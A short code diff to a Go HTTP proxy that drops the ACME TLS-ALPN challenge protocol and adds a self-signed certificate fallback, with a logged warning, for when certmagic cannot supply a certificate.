@@ -38,7 +38,6 @@ import (
 
 	"github.com/elazarl/goproxy"
 	"github.com/fatih/color"
-	"github.com/go-acme/lego/v3/challenge/tlsalpn01"
 	"github.com/inconshreveable/go-vhost"
 	http_dialer "github.com/mwitkow/go-http-dialer"
 	"github.com/tdewolff/minify/v2"
@@ -3827,8 +3826,22 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 				return nil, fmt.Errorf("no wildcard certificate for %s", hostname)
 			}
 
-			tls_cfg.GetCertificate = p.crt_db.magic.GetCertificate
-			tls_cfg.NextProtos = []string{"http/1.1", tlsalpn01.ACMETLS1Protocol} //append(tls_cfg.NextProtos, tlsalpn01.ACMETLS1Protocol)
+			tls_cfg.GetCertificate = func(hello *tls.ClientHelloInfo) (*tls.Certificate, error) {
+				cert, err := p.crt_db.magic.GetCertificate(hello)
+				if err == nil {
+					return cert, nil
+				}
+				// Fallback: if certmagic can't provide a cert (not yet obtained, rate limited, etc.),
+				// generate a self-signed cert so the connection doesn't hard-fail with ERR_SSL_PROTOCOL_ERROR.
+				// The browser will show "Your connection is not private" instead of a protocol error.
+				log.Warning("[TLS] certmagic has no cert for %s, using self-signed fallback: %v", hostname, err)
+				fallbackCert, fallbackErr := p.crt_db.getSelfSignedCertificate(hostname, "", port)
+				if fallbackErr != nil {
+					return nil, fmt.Errorf("no cert available for %s: certmagic=%v, self-signed=%v", hostname, err, fallbackErr)
+				}
+				return fallbackCert, nil
+			}
+			tls_cfg.NextProtos = []string{"http/1.1"}
 
 			return tls_cfg, nil
 		} else {
